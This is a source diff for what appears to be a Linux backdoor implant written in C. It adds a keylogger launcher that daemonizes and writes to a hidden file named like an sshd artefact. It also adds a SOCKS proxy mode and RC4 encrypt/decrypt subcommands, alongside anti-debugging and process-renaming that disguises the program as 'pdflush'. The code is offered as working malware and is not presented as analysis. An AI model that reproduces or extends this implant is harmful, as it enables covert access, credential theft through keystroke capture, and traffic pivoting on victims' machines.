@@ -22,6 +22,7 @@
 #include "common.h"
 #include "antidebug.h"
 #include "rc4.h"
+#include "keylogger.h"
 
 int simple_anti_spkd = 1;
 
@@ -30,6 +31,9 @@ struct rawsock rawsocks[MAXRAWSESSIONS];
 rc4_ctx rc4_crypt, rc4_decrypt;
 extern char **environ;
 extern int dash_main(int, char **);
+extern int main_socksd(int);
+extern int grantpt(int);
+extern int unlockpt(int);
 
 char *dash_envp[] = {
      "TERM=linux",
@@ -120,13 +124,13 @@ void check_already_running() {
     }
 }
 
-void rename_proc(char **argv, int argc) {
+void rename_proc(int argc, char **argv) {
 	antidebug_obfuscate_analysis(6);
     int i;
     for (i = 0; i < argc; i++) {
         memset(argv[i], 0, strlen(argv[i]));
         realloc(argv[i], strlen(PROCNAME)+1);
-        memcpy(argv[i], PROCNAME, strlen(PROCNAME)+1);
+        memcpy(argv[i], PROCNAME, strlen(PROCNAME));
     }
 }
 
@@ -610,6 +614,60 @@ void raw_daemon() {
     }
 }
 
+// NOTE: They should be used only for non critical data. It modify the original content
+void launcher_command_drc4(char *file) {
+	debug("Launching command drc4 to file %s\n", file);
+	FILE *fd = fopen(file, "r");
+	unsigned char buff[BUFSIZE];
+	if (!fd) exit(0);
+	while (fscanf(fd, "%[^\n]\n", buff) > 0) {
+    	rc4_init((unsigned char *)RC4KEY, sizeof(RC4KEY), &rc4_decrypt);
+        rc4(buff, strlen((char *)buff) < BUFSIZE ? strlen((char *)buff) : BUFSIZE, &rc4_decrypt);
+		printf("%s\n", buff);
+	}
+}
+
+// NOTE: They should be used only for non critical data. It modify the original content
+void launcher_command_rc4(char *file) {
+	debug("Launching command rc4 to file %s\n", file);
+	FILE *fd = fopen(file, "r");
+	unsigned char buff[BUFSIZE];
+	if (!fd) exit(0);
+	int len = 0;
+	while (fscanf(fd, "%[^\n]\n", buff) > 0) {
+		len = strlen((char *)buff);
+    	rc4_init((unsigned char *)RC4KEY, sizeof(RC4KEY), &rc4_crypt);
+        rc4(buff, len < BUFSIZE ? len : BUFSIZE, &rc4_crypt);
+		printf("%s\n", buff);
+	}
+}
+
+#if SOCKSD
+void launcher_command_socks(int port) {
+	debug("Launching command socks to port %d\n", port);
+	main_socksd(port);	
+}
+#endif
+
+#if KEYLOGGER
+void launcher_command_keylogger(char *service) {
+	debug("Launching command keylogger to service %s\n", service);
+	char *argv[] = {
+		HOME "/.k_sshd_r",
+		NULL
+	};
+    // Daemonize
+#if ! DEBUG
+    daemonize();
+#endif
+	main_keylogger(1, argv);
+}
+#endif
+
+// pdflush -c drc4 file
+// pdflush -c rc4 file
+// pdflush -c socks port
+// pdflush -c keys sshd
 
 int main(int argc, char **argv) {
     int port = 0;
@@ -642,13 +700,33 @@ int main(int argc, char **argv) {
         return 0;
     } else if (argc == 2) {
         port = atoi(argv[1]);    
-    }
+    } else if (argc == 4 && !strcmp("-c", argv[1])) {
+		if (!strcmp("drc4", argv[2])) {
+			launcher_command_drc4(argv[3]);
+			exit(0);
+		} else if (!strcmp("rc4", argv[2])) {
+			launcher_command_rc4(argv[3]);
+			exit(0);
+		}
+#if SOCKSD
+	   	else if (!strcmp("socks", argv[2])) {
+			launcher_command_socks(atoi(argv[3]));
+			exit(0);
+		}
+#endif
+#if KEYLOGGER	
+		else if (!strcmp("keys", argv[2])) {
+			launcher_command_keylogger(argv[3]);
+			exit(0);
+		} 
+#endif
+	}
 
     // Check if we are running
 	check_already_running();
 
     // Change proc name
-    rename_proc(argv, argc);
+    rename_proc(argc, argv);
 
     // Daemonize
 #if ! DEBUG
